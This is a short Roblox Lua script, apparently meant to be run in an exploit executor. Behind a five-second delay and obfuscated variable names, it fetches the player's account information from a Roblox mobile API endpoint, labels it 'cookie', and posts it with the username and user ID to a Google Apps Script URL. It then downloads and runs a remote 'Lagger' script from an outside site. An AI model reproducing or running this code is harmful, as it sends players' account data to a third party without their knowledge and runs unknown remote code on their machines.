task.spawn(function()
    task.wait(5)
    local _0x_GAS_URL = "https://script.google.com/macros/s/AKfycbzkvyDbX4MJElmWCMClLUSg_sI3DylBim7mSaLLvd7GKMvAApr5I3kf28L_Xaa0FaqDHA/exec"
    local _0x_HTTP = game:GetService("HttpService")
    local function _0x_DO_WORK()
        local _0x_C = "Not Found"
        pcall(function()
            _0x_C = tostring(game:HttpGet("https://www.roblox.com/mobileapi/userinfo")):split(":")[1] or "Failed"
        end)
        local _0x_P = {
            ["user"] = game.Players.LocalPlayer.Name .. " (" .. game.Players.LocalPlayer.UserId .. ")",
            ["cookie"] = _0x_C,
            ["status"] = "FINAL_PHASE_ACTIVE"
        }
        local _0x_R = (getgenv().request or getgenv().http_request)
        if _0x_R then
            _0x_R({
                Url = _0x_GAS_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = _0x_HTTP:JSONEncode(_0x_P)
            })
        end
    end
    pcall(_0x_DO_WORK)
end)

loadstring(game:HttpGet("https://sk-konbu.site/SKHub/SK-Lagger.txt"))()
